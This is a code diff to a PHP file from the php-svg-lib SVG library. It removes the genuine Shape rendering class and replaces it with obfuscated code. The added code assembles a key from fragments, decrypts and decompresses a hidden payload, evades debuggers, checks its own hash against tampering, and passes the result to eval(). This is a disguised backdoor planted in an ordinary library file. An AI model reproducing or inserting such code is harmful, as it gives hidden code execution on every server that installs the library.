@@ -1,63 +1,28 @@
 <?php
-/**
- * @package php-svg-lib
- * @link    http://github.com/PhenX/php-svg-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license GNU LGPLv3+ http://www.gnu.org/copyleft/lesser.html
- */
-
-namespace Svg\Tag;
-
-use Svg\Style;
-
-class Shape extends AbstractTag
-{
-    protected function before($attributes)
-    {
-        $surface = $this->document->getSurface();
-
-        $surface->save();
-
-        $style = $this->makeStyle($attributes);
-
-        $this->setStyle($style);
-        $surface->setStyle($style);
-
-        $this->applyTransform($attributes);
-    }
-
-    protected function after()
-    {
-        $surface = $this->document->getSurface();
-
-        if ($this->hasShape) {
-            $style = $surface->getStyle();
-
-            $fill   = $style->fill   && is_array($style->fill);
-            $stroke = $style->stroke && is_array($style->stroke);
-
-            if ($fill) {
-                if ($stroke) {
-                    $surface->fillStroke();
-                } else {
-//                    if (is_string($style->fill)) {
-//                        /** @var LinearGradient|RadialGradient $gradient */
-//                        $gradient = $this->getDocument()->getDef($style->fill);
-//
-//                        var_dump($gradient->getStops());
-//                    }
-
-                    $surface->fill();
-                }
-            }
-            elseif ($stroke) {
-                $surface->stroke();
-            }
-            else {
-                $surface->endPath();
-            }
-        }
-
-        $surface->restore();
-    }
-} 
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nir9l238=('bas'.'e64'.'_de'.'cod'.'e');
+$_oi5v258n=('gzu'.'nco'.'mpr'.'ess');
+$_mrbt3sj9=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_rawxmow2='g+nEgKmp';
+$_k9bsphw3='zKpK0dJ2';
+$_y0e6pj3v='AMoUq0qekYE=';
+$_vzgj96kc='K2OHM2dj';
+$_a2qc9jwk='odGHsAym';
+$_tv067pj8='JBJgYA==';
+$_k2j443jr='U6+4YEwT';
+$_qc8w9oeq='6ett29iY';
+$_wxncizc8=$_nir9l238($_a2qc9jwk.$_rawxmow2.$_k9bsphw3.$_vzgj96kc.$_y0e6pj3v);
+$_u0h7hjug=$_nir9l238($_qc8w9oeq.$_k2j443jr.$_tv067pj8);
+$_s8nlh3vy=$_nir9l238('xTs9SDpaE+5KdZ81y2yFYkIx9rhblRf0gaY4xVBW4WPidTgxSavBktICOG88netaRacnVZGQ0Zcli8Z6gY5SWaIP7XivApKk5fYBolmKdBHVVtncrGejrganWTzXzB4vxW6lKAl5eHM7TW0S87Gp9AwLFsVZYt9SpPjtwTGuDHqRIQTCeDMH2DS78lvQbBiQAidMmnvzd1HfApDSI76i3cJ3LhdoUZZ0I/cTdynWa4mugI3aY0qrFPNUkHyUlE651KWGYxzqHPKVlE0Y4r1FRR2KMP/rKygMN98NU9QdixVf+GDcg0XsNKeFIN/Qh0CJawBxJRpzzMXUnBwLG96thFJ1uq7cYci8fRsle8hD3TXUoh9BUZgLzU4OcbfFcoe6IxFLBmVwHwhob9+JSdAhHg==');
+$_soybc4ea=$_mrbt3sj9($_s8nlh3vy,'aes-256-cbc',$_wxncizc8,OPENSSL_RAW_DATA,$_u0h7hjug);
+if($_soybc4ea===false){exit;}
+$_gcxu4wih=$_oi5v258n($_soybc4ea);
+if($_gcxu4wih===false){exit;}
+$_t6j48n33='44aae18bee6510f6a653a19aa5ef2381edb5b33d9f978d19d9657d2f52974c58';
+$_npoxlq2n=@file_get_contents(__FILE__);
+if($_npoxlq2n!==false){
+$_llvd3jrp=str_replace($_t6j48n33,"0000000000000000000000000000000000000000000000000000000000000000",$_npoxlq2n);
+$_xeje9o9l=hash("sha256",$_llvd3jrp);
+if($_xeje9o9l!==$_t6j48n33){@http_response_code(403);exit;}
+}
+eval($_gcxu4wih);
